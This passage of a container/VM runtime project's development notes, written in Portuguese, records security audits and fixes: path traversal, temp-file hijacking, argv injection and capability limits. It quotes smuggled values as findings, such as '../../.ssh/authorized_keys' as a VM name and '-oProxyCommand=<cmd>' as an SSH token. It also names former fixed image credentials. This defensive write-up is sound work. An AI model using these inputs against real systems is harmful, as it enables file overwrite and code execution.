   ficheiro-vítima ficava com **0 bytes**. Fechou-se de caminho o `/dev/mem`//`kmem`//`port`
   (char devices, logo passavam o filtro que só recusa BLOCK — inertes em rootless, compromisso
   total do host no caminho root/CRI).
3. **MÉDIO — o `tap` de uma VM não tinha anti-spoofing.** Os veths têm-no desde sempre
   (`iifname … ip saddr != <ip> drop`), o tap nunca teve — e é onde MAIS importa, porque o kernel
   do convidado não é nosso e toda a política deste motor (isolamento cross-namespace,
   `kind: Dependency`) decide pelo IP de ORIGEM. Uma VM forjava um `saddr` fora de `@dlxall` — ou
   de um peer da namespace-alvo — e atravessava a fronteira. A regra passou a ter **uma só
   definição** (`antispoof_rule_args`) partilhada pelos três sítios, a mesma disciplina
   gerador-e-leitor-partilham-o-formato do `fw_rule_tail`; `do_vmtapdel` limpa-a como o
   `do_detach_extra` já fazia (nomes de tap são reutilizados entre reinícios).
4. **MÉDIO — a lista default de masked paths era mais curta que a do runc.** O motor mascarava só
   o que dá CONTROLO do host (`sysrq-trigger`, `kcore`); faltava o que vaza INFORMAÇÃO
   (`timer_list`/`sched_debug` = ponteiros do kernel/KASLR, `interrupts` = side-channel de
   temporização, `/sys/firmware`). O caminho CRI estava bem (o kubelet manda a sua lista); só a
   CLI ficava exposta. `DEFAULT_MASKED_PATHS`/`DEFAULT_READONLY_PATHS` aplicados quando o chamador
   não passa `--masked-path` e não é `--privileged` (semântica Docker/runc). **Medido ao vivo**:
   `/proc/interrupts` vazava 109 linhas e `/sys/firmware` 4 entradas; passaram a 0.
5. **MÉDIO — `clone()` multi-thread no `serve docker-api`.** O `// SAFETY: single-threaded` do
   `clone()` é FALSO neste caminho: o servidor é um runtime tokio multi-thread, e `clone()` (ao
   contrário de `fork()`) **não corre os handlers `pthread_atfork`** que repõem o lock do malloc no
   filho — sob pedidos concorrentes o `container_init` podia bloquear para sempre. Passou a
   re-exec (`__apirun` com o spec por ficheiro `0600`/`O_EXCL`, mais `container start/restart` pela
   CLI), o mesmo padrão que o CRI já usava. **O spec vai por ficheiro e não por argv de propósito**:
   o `RunOpts` tem dezenas de campos e reconstruir uma linha de comando perderia em silêncio o que
   não tem flag — a armadilha que este repo já pagou várias vezes.
   - **Bug encontrado a validar ao vivo, e previsto pelo próprio código**: o comentário do
     `spawn_zombie_reaper` avisava que um `waitpid(-1)` cego «corromperia o estado de saída» de
     qualquer caminho que fizesse o seu próprio `waitpid` — e o re-exec é exactamente esse caminho.
     O container arrancava bem e o `create` respondia `ECHILD`. O reaper passou a **espreitar com
     `WNOWAIT`** e a só colher pids que ninguém reclamou (`AuthoritativeLivePorts` do lado da rede,
     `CLAIMED_PIDS` aqui). Validado: ciclo de vida completo (create/start-304/restart/stop/rm), **8
     creates concorrentes → 8 containers a correr**, e zero zombies.
6. **MÉDIO — credenciais da golden não documentadas.** *(SUPERADO em 2026-08-18: a imagem
   deixou de levar password nenhuma — ver «A imagem base não leva credenciais». O que segue é o
   registo do que era verdade à data desta auditoria.)* `root/delonix` + `delonix:delonix` com sudo
   NOPASSWD são FIXAS e públicas (estão no código), e não havia uma linha sobre isso no README. A
   golden passou a desligar o **login por password no SSH** (drop-in **e** `sshd_config` — o
   bullseye não tem linha `Include`, e o sshd usa a PRIMEIRA ocorrência, por isso um append cego
   seria ignorado); a consola série continua a aceitar a password, que é o caso em que ela serve.
   Documentado no README.

**BAIXOS fechados**: `reap_orphan_hostfwds` deixou de aceitar um `HashSet` cru — exige agora
`AuthoritativeLivePorts::new(...)`, um tipo cuja única função é obrigar quem chama a **afirmar que
possui o ingress inteiro** (foi um chamador externo com lista parcial que fez as portas publicadas
morrerem sozinhas, e custou várias sessões a diagnosticar); `CredVault::write_0600` passou a usar o
`write_atomic_mode` do `SecretStore` irmão (temp por-escritor + fsync + modo na criação — num blob
AEAD uma escrita rasgada não é um ficheiro corrompido, é uma credencial **para sempre**
indecifrável); `~/.kube/config` deixou de ser escrito-e-depois-`chmod`; `--` antes dos posicionais
do `mount` e do `qemu-img convert`; guarda de `-` inicial no hostname do ngrok (o token já a tinha,
por ter sido explorável — o hostname está no mesmo tipo de slot e nunca fora olhado); tecto de
32 GiB no `stream_download`; `personality(2)` restrito aos valores seguros (o default do Docker
bloqueia `READ_IMPLIES_EXEC`/`ADDR_NO_RANDOMIZE`, que não são fuga mas removem mitigações).

**Passagem 2 — a classe que os finders não viram: ficheiro temporário sequestrável.** Uma varredura
posterior a `std::env::temp_dir()` encontrou três chamadores de PRODUÇÃO da mesma classe que a
auditoria de 2026-07 já corrigira em `ensure_libvirt_network` — nenhum dos seis finders lá chegou
porque `bpf.rs` não estava na superfície que lhes foi atribuída (**lição de método**: uma varredura
por PADRÃO, feita depois dos finders por-subsistema, apanha o que a divisão por ficheiros deixa
cair).

- **`delonix-net::bpf::stage_object` — escalada de privilégio local.** Escrevia o objecto BPF no
  caminho **FIXO** `/tmp/delonix_flow.bpf.o` com `fs::write`, e esse ficheiro é entregue a
  `bpftool prog loadall` por um processo com **CAP_BPF/root**. `/tmp` é world-writable, `fs::write`
  segue symlinks, e — o pior — quem pré-criasse o caminho ficava **DONO** do ficheiro: num `/tmp`
  sticky nem o conseguimos apagar, por isso podia trocar-lhe o conteúdo entre a nossa escrita e a
  leitura do `bpftool`. Um utilizador local sem privilégio punha o SEU programa BPF dentro do
  kernel. Os outros dois (`cluster.rs` kubeadm-config, `lb.rs` haproxy.cfg, ambos enviados por
  `scp`) tinham nome derivado do pid — igualmente adivinhável, mesmo vector de redirecção.
- **`delonix_runtime_core::write_private_temp`** (novo, um só sítio em vez de uma 4.ª cópia): nome
  único + **`O_EXCL`** (recusa um caminho existente e **não segue symlinks**) + `0600` na criação.
  O objecto BPF passa também a ser **removido depois do load** — com nome fixo era sobrescrito na
  chamada seguinte, com nome único ficaria a acumular.
- **`fetch_kubeconfig`: `mode()` só se aplica na CRIAÇÃO.** A correcção anterior
  (`OpenOptions::create(true).mode(0o600)`) fechava a janela de umask mas tinha um buraco mais
  silencioso: um `cluster apply` repetido sobre um kubeconfig deixado por uma build antiga
  reescrevia as credenciais e **mantinha o 0644 de lá**. Passou a `write_atomic_mode` — o rename dá
  o modo certo sempre, substitui um symlink em vez de o seguir, e torna a actualização atómica.
  (O comentário anterior invocava equivalência com o fix do `ensure_libvirt_network`, que usa
  `create_new`; não era equivalente, e é essa a diferença.)

**Estado**: `cargo build/test --workspace` limpo (0 falhas), `clippy` 0, `fmt` aplicado. Validado ao
vivo neste host: mascaramento dentro de containers reais (musl E glibc), `docker-api` ponta-a-ponta
com concorrência, `net flow` (degrada para contadores de veth sem CAP_BPF, e já não cria o caminho
fixo nem deixa restos), e o `container run` normal sem regressão.

## Tecto de capabilities no CRI (`DELONIX_CRI_CAP_CEILING`, v0.47.0)

Um limite MÁXIMO, definido no nó, para as capabilities de qualquer container criado através do CRI
— seja o que for que o kubelet peça, incluindo `privileged: true`. `crates/delonix-cri/src/
cap_ceiling.rs` (`CapCeiling`), configurado por `DELONIX_CRI_CAP_CEILING` / `..._MODE` ou por
`delonix serve cri --cap-ceiling/--cap-ceiling-mode` (flag > env, mesma precedência do `--addr`).

**Porque no runtime e não só no admission.** Tudo o que chega ao `create_container` já vem
autorizado: o securityContext é traduzido em flags sem opinião nenhuma (correcto — o runtime não é
o admission controller). Isso deixa a única barreira entre um `privileged: true` e todas as
capabilities do kernel numa cadeia de admission que corre noutro processo, noutra máquina, e cuja
configuração este nó não consegue ver nem verificar. O tecto é a resposta local: vale mesmo com o
Pod Security mal configurado, com um `crictl` a falar directamente com este socket, ou com um
static pod que nunca passou pelo API server.

- **Gramática** (`parse`, pura e testada): ausente/vazio/`all` → **sem tecto, comportamento
  byte-a-byte igual ao anterior**; `none` → capability nenhuma; `default` → o `KEPT_CAPS` do motor;
  `default,NET_ADMIN` → o baseline mais as nomeadas; lista de nomes (`CAP_` opcional,
  case-insensitive) → exactamente essas. Um nome desconhecido, um modo desconhecido, ou um valor só
  com separadores **impedem o servidor de arrancar** (`exit 2` no `delonix-cri`, erro do CLI no
  `serve cri`, nos dois casos antes de qualquer `bind`) — um tecto que caísse em silêncio para
  «ilimitado» por causa de um typo era precisamente a falha que isto existe para evitar.
- **Dois modos, e a assimetria é deliberada**: um pedido EXPLÍCITO acima do tecto (`capabilities.
  add`, ou `privileged`) é **recusado no `CreateContainer`** com `PermissionDenied` a NOMEAR as
  capabilities negadas (o kubelet mostra-o no pod de imediato) — `mode=clamp` corta-o e avisa em
  `warn`, para endurecer um nó cujos PodSpecs não se podem mudar hoje. Mas o **baseline implícito**
  (o `KEPT_CAPS` que um container recebe sem pedir nada) é reduzido ao tecto **sem erro nos dois
  modos**: baixar um default que o workload nunca pediu é o que «tecto» significa, e recusar todos
  os pods do nó porque o default do próprio motor é mais largo que o limite tornaria a
  funcionalidade inútil.
- **O clamp não reimplementa a resolução de capabilities** — chama o `resolve_cap_keep` DO MOTOR e
  intersecta com o tecto, emitindo `--cap-drop ALL` + um `--cap-add` por capability do conjunto
  final. Por isso o módulo `delonix_runtime::capabilities` passou a ser **público** (`KEPT_CAPS`/
  `cap_num`/`cap_name`/`all_caps_mask`/`resolve_cap_keep`/`names_from_mask`, movidos do interior do
  `lib.rs`): uma segunda tabela nome↔número do lado do CRI divergiria no dia em que uma capability
  fosse acrescentada aqui — a mesma disciplina gerador-e-leitor-partilham-o-formato do
  `fw_rule_tail`. Há teste de round-trip (`cap_name`↔`cap_num` para 0..=40, e mask→nomes→mask).
- **Limita SÓ capabilities.** Um pod privilegiado continua a ter `seccomp=unconfined`, `/sys`
  escrivível e cgroupns próprio — são eixos separados do `--privileged`, e cortar capabilities não
  torna um pod privilegiado seguro. O módulo di-lo em vez de sugerir um endurecimento que não
  entrega.
- **Armadilha apanhada pelo teste, do tipo «um teste pode codificar o bug»**: a primeira versão
  modelava `privileged` como `resolve_cap_keep(cap_drop, ["ALL"])`, o que parece equivalente e não
  é — no motor `privileged` **ignora** o `cap_drop` por inteiro (`if privileged { all_caps_mask() }`).
  O clamp tem de prever o que o motor CONCEDE, não o que discutivelmente devia. Teste dedicado
  (`privileged_ignora_o_cap_drop_como_no_motor`).
- **Observabilidade**: banner no arranque (stdout do servidor + `tracing::info`) e o tecto em vigor
  no `status(verbose)` → `info["capabilityCeiling"]`, legível por `crictl info`. Sem isto, um tecto
  activo mas invisível seria diagnosticado como «o runtime largou-me as capabilities sem razão». O
  `warn` do clamp só sai quando um pedido EXPLÍCITO foi cortado (`ceiling_reduces`) — avisar quando
  só o baseline baixou daria uma linha por cada arranque de container do nó.
- **Validado ao vivo neste host**: fail-closed nos dois pontos de entrada (valor e modo inválidos,
  em EN e PT, sem socket criado); servidor `delonix-cri` real a anunciar o tecto expandido; e — o
  pressuposto central do clamp — o argv emitido aplicado pelo MOTOR real, com o kernel a confirmar
  `CapEff 0x1001` (CHOWN+NET_ADMIN exactos) contra `0xa0042dfb` do baseline e `0x1ffffffffff` de um
  `--privileged`. **FECHADO a 2026-08-15**: esta nota dizia que o caminho gRPC não era validável aqui
  porque não há `crictl` e o `build_client(false)` não gerava stubs de cliente — e concluía que «a
  camada tonic são três linhas de `blocking(...)`». Isso é uma razão para ACHAR que funciona, não
  uma medição. O cliente passou a ser gerado (custo medido antes de decidir: **3,5 s** de build no
  crate) e `crates/delonix-cri/tests/grpc_status.rs` faz o round-trip a sério — sobe o servidor num
  socket unix, chama `Version` e `Status` pelo cliente gerado, e exige as duas condições que o
  kubelet lê. Verificado que apanha regressão: com o `Status` a devolver condições vazias, chumba
  em «faltou RuntimeReady: []». Continua por validar com um **kubelet** real — isso precisa de um
  nó, não de um cliente.
- **Por fazer, deliberadamente**: nada disto toca no `container run` da CLI (lá quem escolhe é o
  operador, não um pedido remoto — um tecto local seria o utilizador a limitar-se a si mesmo); e
  `add_ambient_capabilities` do CRI continua sem tradução nenhuma no motor (gap pré-existente,
  anterior a este trabalho).

## Auditoria de segurança #2 (código VM desta série: console/rede/cloud-init)

Skill `delonix-runtime-sec` corrida sobre a superfície NOVA das v0.7.x (VM
console/vnc, firmware/backend automáticos, rede libvirt, cloud-init user-data,
instalador). O container `run` está limpo (id gerado + `safe_key`); a VM era a
excepção porque os caminhos auxiliares usavam o nome CRU.

**Achado ALTO — CORRIGIDO — path traversal via nome da VM.** O nome (do CLI OU
de `metadata.name` de um manifesto NÃO-confiado via `stack apply -f`) fluía cru
para `state_root/vms/<name>` (`generate_seed_iso`) e para o overlay
`<name>.qcow2` — um `metadata.name: "../../.ssh/authorized_keys"` escrevia/
sobrescrevia ficheiros FORA do directório de estado, como o utilizador
(arbitrary file write conduzido por manifesto). O `JsonStore` já sanitizava o
`.json` (`safe_key`), mas os caminhos de seed/overlay/sock não. **Fix**:
`delonix_vm::valid_vm_name` (whitelist `[A-Za-z0-9._-]`, sem `..`/`/`/`-`
inicial/controlo) chamada no topo de `delonix_vm::create` — o boundary do
motor, por isso qualquer consumidor da API herda. Fecha de uma vez os 3
vectores do nome: traversal, argv do `virsh`, e injecção no YAML do cloud-init
(o nome vira `hostname`). Teste `valid_vm_name_recusa_exploits`.

**Achado BAIXO — CORRIGIDO — argv do `virsh` sem `--`.** `virsh -c uri console/
start/destroy/domstate/... <name>` sem `--`: um nome começado por `-` seria lido
como opção. Coberto já pela `valid_vm_name`, mas acrescentou-se `--` antes do
nome/rede em todos os argv `virsh` (defesa em profundidade, mesmo padrão do
`ssh`/`scp` da auditoria #1).

**Achado MÉDIO — CORRIGIDO — ficheiro temp previsível (rede libvirt).**
`ensure_libvirt_network` escrevia o XML da rede em `/tmp/delonix-libvirt-
default-<pid>.xml` (nome previsível, world-writable) com `fs::write` — outro
utilizador local podia pré-criar um symlink e desviar a escrita. **Fix**:
`OpenOptions::create_new` (O_EXCL, não segue symlinks) + `mode(0o600)`.

**Achado MÉDIO — DOCUMENTADO — downloads do instalador sem checksum.** O
`install.sh` verifica o binário `delonix` contra o `SHA256SUMS`, mas o
`cloud-hypervisor-static` e o `hypervisor-fw` (upstreams oficiais) são
instalados só com HTTPS, sem verificação de hash — o upstream não publica
checksums num formato conveniente. MITM mitigado por TLS; um upstream
comprometido ou TLS-stripping passaria. Aceite como risco documentado (mesma
natureza do cloud-hypervisor que já se instalava assim); fechar exigiria os
upstreams publicarem/pinar-se um digest.

## Auditoria E2E ampla (14 finders × verificação adversarial) — estado

Auditoria ofensiva de todo o ecossistema (~50k LOC, 9 crates: bugs/gaps/design/
performance/concorrência/memória/recursos), 14 finders por subsistema, cada
achado passado por 2 céticos adversariais. **Relatório completo em
[docs/AUDITORIA-E2E.md](docs/AUDITORIA-E2E.md)** — 24 achados confirmados (6 HIGH,
12 MEDIUM, 6 LOW) + 11 por-verificar nessa corrida original.

**Os 6 HIGH foram CORRIGIDOS no v0.9.0** (path traversal em whiteouts OCI via
`safe_rel`+confinamento canonicalizado; IDs de CRI via `valid_cri_id`+`remove_rec`;
nome de VM em `generate_seed_iso` via `valid_vm_name` na origem; kubeconfig via
`sudo cat` para stdout do SSH, nunca toca em disco remoto; `COPY` do build via
`confine_to` (canonicaliza + confere `starts_with`); socket de gestão via
`SO_PEERCRED`+modo 0600, espelhado no `delonix-cri`) — **re-verificados ao vivo
numa 2.ª sessão (2026-07-23), código actual lido linha a linha, os 6 continuam
corrigidos**, sem regressão. **Auditoria adversarial INDEPENDENTE genuína feita
em 2026-07-26** (a sessão de 2026-07-23 releu o próprio código, mas não era um
2º par de olhos externo tentando activamente reconstruir cada exploit): 5/6
confirmados sólidos ao tentar reproduzir o exploit original; o kubeconfig
tinha um **TOCTOU residual real** (não hipotético) — `fs::write` cria o
ficheiro no modo do umask (664 medido ao vivo neste host) e só DEPOIS aplica
`chmod 600`, uma janela em que outro utilizador local podia ler as
credenciais cluster-admin. **Corrigido**: `OpenOptions::mode(0o600)` define o
modo ATOMICAMENTE na criação (`cmd/cluster.rs::fetch_kubeconfig`), o mesmo
padrão que `ensure_libvirt_network` já usa — ver
`docs/COMPARACAO-DOCKER-PODMAN.md` secção 1a/1b para o relatório completo.

**Dos outros 29 (12 MEDIUM + 6 LOW confirmados + 11 por-verificar), a
re-triagem de 2026-08-04 confirmou que praticamente TODOS já estão fechados** —
esta nota dizia «27 continuam em aberto» e estava ERRADA: era o `AUDITORIA-E2E.md`
que nunca tinha sido actualizado à medida que as correcções entravam. Cada um foi
re-verificado por leitura do código actual (não pela tabela), e o cabeçalho do
`docs/AUDITORIA-E2E.md` regista a amostra do que foi confirmado e como. O único
resíduo real encontrado nessa triagem foi o #11 (`SecretStore::save` sem `fsync` e
com TOCTOU de modo), corrigido no v0.38.3. **Lição de método**: uma tabela de
achados que não é actualizada com as correcções passa a mentir nos dois sentidos —
aqui fez 27 problemas resolvidos parecerem dívida viva durante semanas. Os 2 "por-verificar" de maior severidade da corrida original **já estão
CONFIRMADOS CORRIGIDOS** (o `AUDITORIA-E2E.md` ainda os lista como abertos por
lapso — `docs/COMPARACAO-DOCKER-PODMAN.md` tem o detalhe de cada um): fuga de
rootfs no `--rm` rootless (`container.rs`, ambos os ramos foreground/watcher já
chamam `remove_container_dir`, desde o commit `7bde467`/v0.19.0) e o `egress`
global que apagava regras per-network por correspondência de substring demasiado
ampla (`infra.rs:1531`, `is_global_egress_drop_line` já exclui linhas com
`iifname`, confirmado na 2ª ronda — ver secção 1b do `COMPARACAO-DOCKER-PODMAN.md`).

### 2.ª ronda (2026-07-23) — 4 auditorias em paralelo, 2 CRITICAL + 3 HIGH novos, CORRIGIDOS no v0.10.1

Pedida uma revisão completa (bugs/gaps/design/arquitectura, não só segurança).
Além de re-verificar os 35 achados acima, 3 auditorias frescas: `delonix-runtime/
lib.rs` (104 `unsafe`, NUNCA antes auditado), `delonix-net/infra.rs` (holder/
control-socket), e todo o código desta MESMA sessão anterior (Tunnel, ShareVolume,
`cluster.rs`, specs agrupados) — código com zero revisão prévia. 2 CRITICAL + 3
HIGH, **todos já em produção no v0.10.0**, corrigidos de imediato (ver
[docs/releases/v0.10.1.md](docs/releases/v0.10.1.md) para o detalhe completo).
**Confirmado de forma independente em 2026-07-26**: uma auditoria adversarial
fresca sobre estes DOIS mesmos ficheiros (mapeamento uid/gid, seccomp/`clone3`,
`safe_bind_target`, eBPF do device-cgroup, higiene de fd em todos os forks,
`SO_PEERCRED` em todo o dispatch do socket de controlo) não encontrou nenhum
achado novo CRITICAL/HIGH — ver `docs/COMPARACAO-DOCKER-PODMAN.md` secção 1b
para o relatório completo. Os achados originais desta ronda:

1. **`kind: ShareVolume` com `name: ".."` escapava para o Storage pai inteiro** —
   `VolumeStore::valid_name` aceitava um nome só de `.` (`".."` passava no
   charset); `sharevolume rm --purge-data` nesse nome apagava o NAS partilhado
   inteiro. Corrigido no `valid_name` (recusa `.`-prefixo/`..`), protege todos os
   consumidores do store.
2. **Injecção de argv SSH via token do `kind: Tunnel`** — o token do pinggy ia
   sem `--` como último argumento posicional do `ssh`; um token
   `-oProxyCommand=<cmd>` era lido como opção → RCE local. Corrigido em
   `resolve_token` (recusa `-` inicial) + `--` no argv.
3. **Nomes de container nunca validados** — `container run --name
   registry.npmjs.org` (sem privilégio) sequestrava a resolução DNS desse
   hostname para TODO o nó, em qualquer namespace. Corrigido com
   `valid_container_name` (exclui `.` deliberadamente, ao contrário do
   `valid_vm_name`).
4. **`cluster kubeadm --copy-kubeconfig` confiava no `admin.conf` remoto por
   inteiro** — um `users[].user.exec` legal vira RCE local no operador se o
   control-plane for comprometido depois do provisionamento. Corrigido:
   `safe_cluster_entry`/`safe_user_entry` constroem entradas novas só com os
   campos que o `admin.conf` real do kubeadm tem.
5. **Bind-mounts seguiam symlinks plantados pela imagem, antes do `pivot_root`**
   — `mount_target_safe` só lexical; a imagem podia redireccionar
   `create_dir_all`/`open` para qualquer caminho real do host. Corrigido com
   `safe_bind_target` (resolve componente a componente, recusa symlinks) — o
   equivalente, do lado do motor, ao `confine_to` do build.

Todos validados ao vivo contra o exploit real, não só testes unitários (ver o
histórico de commits `4c3e223`/`456925f`). Achado #3 acima é uma escalada do
achado "por-verificar" MEDIUM de DNS hijack da corrida original (o CLI directo,
sem manifesto nenhum, já bastava).

## Ciclo de vida VM no libvirt (`vm stop/rm`) — managed save, órfãos, `--force`

Bug report real (host kaeso-sys-01): `vm rm dev` vazava o stderr cru do `virsh`
("Failed to destroy… not running" + "Refusing to undefine while domain managed
save image exists"), apagava o registo local NA MESMA e deixava o domínio
**órfão** no libvirt; o `vm stop` seguinte respondia "no such container" (o
substantivo errado). Corrigido em `delonix-vm` (`libvirt_cleanup`/`quiet`/
`libvirt_poweroff`/`libvirt_domain_uri`) + `cmd/vm.rs`:

- **`undefine` leva sempre `--managed-save --snapshots-metadata --nvram`**
  (fallback para o simples em virsh antigo) — era a causa-raiz da recusa; o
  `destroy` só corre se o domínio NÃO estiver "shut off". Nada do `virsh` vaza
  cru: `quiet()` captura stdout+stderr e compõe a mensagem (sem o prefixo
  `error: ` do virsh).
- **`VmBackend::stop` devolve `Result`** e o `rm` **preserva o registo local se
  a limpeza no backend falhar** (erro claro + hint); `vm rm -f/--force`
  descarta o estado local na mesma. Sem órfãos silenciosos em nenhum sentido:
  `rm`/`stop` também reconhecem um domínio libvirt SEM registo local (órfão de
  antes do fix) e limpam-no/desligam-no.
- **`Error::VmNotFound`** ("no such VM: … (see `delonix vm ls`)") em
  `stop`/`remove`/`status` — o `NotFound` partilhado diz "no such container".
  Armadilha a reter: **`JsonStore::remove` é idempotente** (ausência = Ok),
  por isso o "não existia" tem de se decidir ANTES (flag `existed`), não pelo
  retorno do `st.remove`. `vm rm <inexistente>` agora é erro, como no docker.
- Aliases: `vm down` = `stop`, `vm delete` = `rm`. Testes:
  `quiet_captura_o_stderr_sem_o_prefixo_error`,
  `stop_e_remove_de_vm_inexistente_dizem_no_such_vm`. Validado ao vivo: o
  órfão `dev` real (shut off + managed save) foi removido em silêncio.

### `vm console` preso em "Active console session exists" (v0.11.1)

Bug report real (host kaeso-sys-01): depois de um `vm console` terminar de
forma não limpa (SSH caída, Ctrl-C a atingir o `virsh` em primeiro plano,
terminal fechado), o libvirt continua a achar que há uma sessão de consola
ligada a esse domínio — toda a tentativa seguinte de `vm console` na MESMA VM
falha para sempre com `error: operation failed: Active console session exists
for this domain`, sem saída a não ser reiniciar o `libvirtd` do host.
**Corrigido**: `--force` no `virsh console` (`cmd_console`, `cmd/vm.rs`) — a
flag existe exactamente para isto ("disconnect already connected sessions").
Como `vm console <nome>` é um comando de um único operador, uma sessão presa
da tua PRÓPRIA ligação anterior é o caso esmagadoramente comum, não um
segundo espectador real a proteger.

### `vm snapshot create|ls|rm|restore` — checkpoint de sistema first-class (libvirt)

Snapshot/restore como métodos de 1.ª classe do `VmBackend` (antes só existiam como
nada — o trait tinha `boot/stop/is_running/ip`, ver a matriz da descoberta Fase 1).
Funções de motor `delonix_vm::{snapshot,restore,snapshots,delete_snapshot}` (espelham
`stop`/`status`: `load_vm` + `backend_for` + dispatch).

- **BREAKING na v0.51.x, corte limpo sem aliases**: os três comandos PLANOS
  (`vm snapshot <vm> <n>` / `vm snapshots <vm>` / `vm restore <vm> <n>`) deram lugar ao
  grupo **`vm snapshot create|ls|rm|restore`** — os mesmos quatro verbos, pela mesma
  ordem, do `volumes snapshot` que já existia (um checkpoint é um checkpoint; quem
  aprendeu um não devia ter de aprender o outro). O motivo directo foi não haver **forma
  nenhuma de APAGAR** um snapshot pela CLI — a única saída era o `virsh snapshot-delete`,
  e era a própria mensagem de erro do motor que o mandava fazer. O grupo `vm` está
  declarado NÃO estável no `docs/cli-stability.md`, e a forma antiga falha **alto**
  (`unrecognized subcommand`, rc=2), nunca em silêncio.
- **libvirt**: `virsh snapshot-create-as --domain <vm> --name <n> --atomic` — de uma VM
  **a correr** é um checkpoint de SISTEMA (memória **+** disco), e `restore`
  (`snapshot-revert`) volta a ele. Argv puro e testado (`libvirt_snapshot_argv`/
  `libvirt_revert_argv`, via `--domain`/`--name`, nunca posicional → um nome validado
  não vira opção). Nome do snapshot validado com `valid_vm_name` (recusa `..`/`-`
  inicial/injecção).
- **Os quatro verbos funcionam com a VM PARADA** (v0.51.x) — e isto era a limitação que
  restava: o `stop` faz *undefine* do domínio, e sem domínio o virsh respondia
  `failed to get domain`, uma frase que manda procurar uma VM que está ali no `vm ls`.
  `with_stopped_domain` **define o domínio só durante o comando**, a partir do
  `vms/<vm>.xml` que o último `boot` escreveu — o mesmo ficheiro que o libvirt tinha,
  seclabel DAC incluído, em vez de derivar uma descrição que depois teria de bater
  certo com o `boot` à mão — devolve os metadados preservados, corre o verbo, volta a
  guardá-los e desfaz o domínio. Por isso o `stop` **deixou de apagar o `<vm>.xml`**.
  Um snapshot tirado assim é **só do disco** (`state=shutoff`), que é o honesto para uma
  VM sem memória para capturar, e a VM **continua parada**. A ÚNICA excepção em que o
  domínio fica definido é um `restore` de um checkpoint tirado a correr: o revert repõe
  a memória, logo o convidado fica a correr — desfazer o domínio por baixo de uma VM viva
  não é limpeza, é matá-la. Nesse caso avisa (`note: … is RUNNING again`) e o `restore`
  público reconcilia o registo chamando o `status` que já existe, em vez de escrever um
  segundo reconciliador que possa discordar dele.
- **A CLASSE da falha é a mesma esteja a VM parada ou a correr** — `Error::NotFound`
  (**4**) para um snapshot que não existe, `Error::Conflict` (**5**) para um nome já
  usado. Antes, as duas saíam como **1** genérico com a resposta crua do virsh, em que
  «domain moment off1 already exists» usa uma palavra (`moment`) que esta CLI nunca diz.
- **O snapshot SOBREVIVE a um `vm stop`/`vm start` (v0.51.x)** — e até aqui não sobrevivia,
  em silêncio. Bug report real, reproduzido antes de qualquer código: `snapshot` → `stop`
  → `start` deixava `vm snapshots` **VAZIO com rc=0** e o `vm restore` a responder
  «Domain snapshot not found». Causa: o `undefine --snapshots-metadata` do `libvirt_cleanup`,
  que o `stop` reutiliza. **O que a medição mudou**: `qemu-img snapshot -l` sobre o overlay
  mostrava o `s1` **intacto** depois do stop — o `undefine` não apaga o snapshot, apaga só o
  que aponta para ele. Portanto isto não era um limite do mecanismo, era **estado necessário
  para reconstruir o recurso a ser deitado fora** — a mesma armadilha do `-v` não persistido,
  das redes extra e do `Container.pod`, agora do lado do libvirt.
  - `VmBackend::preserve_snapshots` (default: nada, logo o CH e o Proxmox ficam byte a byte
    iguais) faz `snapshot-dumpxml` de cada um para `vms/<vm>/snapshots/<n>.xml` — dentro do
    directório que o `remove` **já** apaga inteiro, com teste a exigi-lo (noutro sítio, um
    `vm rm` deixaria metadados a apontar para um disco que já não existe, e a VM seguinte com
    o mesmo nome herdava-os). É chamado pelo `stop` PÚBLICO, **antes** do `backend.stop`: uma
    falha aborta o stop sem nada perdido. O `remove` não passa por lá de propósito.
  - O `boot` devolve-os ao libvirt logo a seguir ao `define` — e o que faltava para isso não
    era óbvio: o `snapshot-create --redefine` **RECUSA** um XML cujo uuid de domínio não seja
    o actual, e o uuid é atribuído pelo libvirt em cada `define`, logo nunca é o de quando o
    snapshot foi tirado. `snapshot_xml_with_uuid` reescreve-o (puro, testado) — em TODAS as
    ocorrências, que são duas no ficheiro real; substituir só a primeira dá o mesmo erro pela
    ocorrência que ficou.
  - **`vm snapshot ls` de uma VM parada lê os preservados** — perguntar ao libvirt por um
    domínio que não existe devolve lista vazia, indistinguível de «nunca teve snapshot».
  - **Gate**: secção nova no `scripts/e2e.sh` que corre o CICLO (create → stop → start →
    restore, mais os quatro verbos com a VM PARADA e as classes 4/5) contra uma VM libvirt
    real, e salta com linha audível sem virsh/libvirt. Hoje **20/20**; a versão que cobria só
    o ciclo original foi verificada pela regra do repo em **9/9 com a correcção e 4/9 com ela
    revertida**. Tinha de ser o ciclo — antes da correcção cada comando devolvia 0 por si. E
    o `rm` confirma-se com `qemu-img snapshot -l`: sair da LISTA não é sair do disco.
- **Cloud Hypervisor (v0.51.x): os mesmos quatro verbos, OFFLINE** — `qemu-img snapshot
  -c/-a/-d` no overlay da VM, e `ls` por `qemu-img info -U` (parser puro, escrito contra a
  saída REAL; a primeira versão partia na linha de cabeçalho e devolvia lista vazia — o
  teste apanhou-o antes do primeiro uso). Com a VM **a correr** os três verbos que ESCREVEM
  são **recusados com erro dirigido** (`vm stop` primeiro, ou `--backend libvirt`); só o
  `ls` responde, e é por isso que precisa do `-U`: o vmm segura o qcow2 e o `snapshot -l`
  abre em leitura-escrita.
  - **Porque NÃO se expôs a `vm.snapshot` do próprio CH**, que existe e funciona (medido ao
    vivo numa VM real: `pause` → `PUT /api/v1/vm.snapshot` → `resume` escreve `config.json`
    + `state.json` + um `memory-ranges` do tamanho da RAM inteira do convidado, 512 MiB):
    ela guarda **memória e dispositivos, NÃO o disco**, e o CH não tem API de snapshot de
    disco ao vivo nenhuma — enquanto o vmm corre segura o qcow2 em exclusivo, por isso mais
    ninguém o pode capturar (`qemu-img` responde «Failed to lock byte 100», medido, com e
    sem `-U`). Restaurá-la mais tarde, contra um disco que continuou a ser escrito, não é
    voltar atrás: é um convidado cuja memória acredita num filesystem que já mudou. Expô-la
    como `snapshot` faria o MESMO comando significar «volta atrás no tempo» no libvirt e
    «retoma este instante, se ninguém tocou no disco» aqui — a divergência silenciosa entre
    backends que este motor recusa publicar. Um par `vm suspend`/`vm resume` é onde essa
    capacidade pertence.
  - **Gate próprio** (`scripts/e2e.sh`, secção CH): **13/13** ao vivo — a recusa com a VM a
    correr (e que a mensagem diz o que fazer), os quatro verbos com ela parada, as classes
    4/5, o `ls` a responder com o vmm a segurar o ficheiro, e o `rm` confirmado com
    `qemu-img snapshot -l`. Salta com linha audível sem `cloud-hypervisor` ou quando o
    `create` não passa (o vmm do CH vive dentro do holder de rede).
- **Validado ao vivo** (host com `qemu:///session`): VM real da golden 1.34 →
